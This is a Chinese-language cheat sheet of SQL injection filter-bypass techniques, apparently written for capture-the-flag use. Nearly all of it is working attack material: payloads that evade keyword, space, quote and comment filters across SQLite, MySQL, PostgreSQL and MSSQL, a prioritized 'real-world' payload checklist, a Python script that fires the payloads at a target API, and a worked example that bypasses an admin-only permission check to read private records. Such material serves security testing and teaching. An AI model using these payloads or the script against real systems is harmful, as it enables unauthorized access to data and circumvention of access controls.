# SQL 注入绕过技术大全

## 1. 关键字替代

### OR/AND 绕过
```sql
# 原始
' OR 1=1--
' AND 1=1--

# 替代方案
' || 1=1--          # 最常用！SQLite/PostgreSQL
' && 1=1--          # MySQL
' || '1'='1         # 不需要注释符
'/**/OR/**/1=1--    # 注释代替空格
' oR 1=1--          # 大小写混合
' OORR 1=1--        # 双写绕过
```

### UNION/SELECT 绕过
```sql
# 原始
' UNION SELECT 1,2,3--

# 替代方案
' UnIoN SeLeCt 1,2,3--           # 大小写
' UNUNIONION SELSELECTECT 1,2,3-- # 双写
' /*!UNION*/ /*!SELECT*/ 1,2,3-- # MySQL注释
' UNION/**/SELECT/**/1,2,3--     # 内联注释
' UNION%0aSELECT%0a1,2,3--       # 换行符
```

## 2. 空格绕过

```sql
# 用注释代替空格
'/**/OR/**/1=1--

# 用特殊字符代替空格
'%09OR%091=1--    # Tab
'%0aOR%0a1=1--    # 换行
'%0dOR%0d1=1--    # 回车
'%0bOR%0b1=1--    # 垂直制表符
'+OR+1=1--        # 加号（URL编码场景）

# 用括号代替空格
'OR(1=1)--
'AND(1)=(1)--
```

## 3. 引号绕过

```sql
# 不使用引号
' OR 1=1--
' OR 1 LIKE 1--

# 十六进制编码
' OR 0x31=0x31--

# 宽字节注入（GBK编码）
%bf%27 OR 1=1--
%df%27 OR 1=1--
```

## 4. 等号绕过

```sql
# 原始
' OR 1=1--

# 替代方案
' OR 1 LIKE 1--
' OR 1 IN (1)--
' OR 1 BETWEEN 0 AND 2--
' OR 1<>2--           # 不等于（逻辑取反）
' OR NOT 1>1--
```

## 5. 注释符绕过

```sql
# 标准注释
--
#
/**/

# 替代方案
--+
-- -              # 注意空格
;%00              # NULL字节
'/*                # 不闭合注释
```

## 6. 数据库特定技巧

### SQLite
```sql
' || '              # 字符串连接（最简单的绕过！）
' GLOB '*'--        # 通配符
' LIKE '%'--        # 模糊匹配
```

### MySQL
```sql
' OR '1'='1' #
' OR 1=1-- -
/*!50000UNION*/     # 版本注释
```

### PostgreSQL
```sql
' || '1'='1
' OR 1::int=1--
```

### MSSQL
```sql
' OR 1=1--
' OR 1=1;--
```

## 7. 常见过滤绕过场景

### 场景1: 过滤 OR/AND
```sql
# 使用 || 代替 OR
{"job_type": "private'||'"}

# 使用 && 代替 AND
{"job_type": "back-end'&&'1'='1"}
```

### 场景2: 过滤空格
```sql
# 使用注释
{"id": "1'/**/OR/**/1=1--"}

# 使用括号
{"id": "1'OR(1=1)--"}
```

### 场景3: 过滤引号
```sql
# 使用十六进制
{"id": "1 OR 0x31=0x31--"}

# 数字比较
{"id": "1 OR 1=1--"}
```

### 场景4: 白名单过滤关键字
```sql
# 如果检测到 select/union/or 就返回全部数据
# 尝试不包含这些关键字的 payload
{"job_type": "private'||'"}  # 只用 || 不用 OR
```

## 8. 实战 Payload 清单

### 快速测试（按顺序尝试）
```sql
'                    # 测试是否有注入
''                   # 测试引号闭合
' OR '1'='1          # 标准注入
' || '1'='1          # OR 替代
'/**/OR/**/1=1--     # 空格绕过
' OR 1=1#            # MySQL 注释
' OR 1=1-- -         # 通用注释
```

### 获取隐藏数据
```sql
# 如果有 type='public' 过滤
type='private'||'    # 绕过获取 private 数据
type='admin'||'      # 绕过获取 admin 数据
```

## 9. 自动化测试脚本

```python
import requests

target = "http://target/api"
payloads = [
    "' OR '1'='1",
    "' || '1'='1",
    "'/**/OR/**/1=1--",
    "' OR 1=1#",
    "' || '",
    "'||'",
]

for payload in payloads:
    data = {"param": f"value{payload}"}
    r = requests.post(target, json=data)
    print(f"Payload: {payload}")
    print(f"Response: {r.text[:200]}")
    print("-" * 50)
```

## 10. 权限绕过场景（重要！）

### 场景描述
当 API 返回 "Only admins can see..." 或 "Permission denied" 时，说明存在权限检查。
这种情况下，SQL 注入的目标是**绕过权限检查**，而不是注入新的查询。

### 典型案例
```
# 正常请求
POST /jobs {"type": "public"}     → 返回公开数据
POST /jobs {"type": "private"}    → 返回 "Only admins can see private"

# 绕过方法：使用 || 拼接空字符串
POST /jobs {"type": "private'||''"}  → 返回 private 数据（包含 FLAG）
```

### 原理
SQL 查询可能是：
```sql
SELECT * FROM jobs WHERE type = '{input}' AND is_public = 1
```

注入 `private'||''` 后变成：
```sql
SELECT * FROM jobs WHERE type = 'private'||'' AND is_public = 1
```

在 SQLite 中，`'private'||''` 等于 `'private'`，但绕过了应用层的关键字检查！

### 关键点
1. **找到被限制的值**：如 `private`, `admin`, `secret`
2. **使用 `'||''` 绕过**：这是最简单有效的方法
3. **不需要复杂的 UNION/SELECT**：只需绕过字符串检查
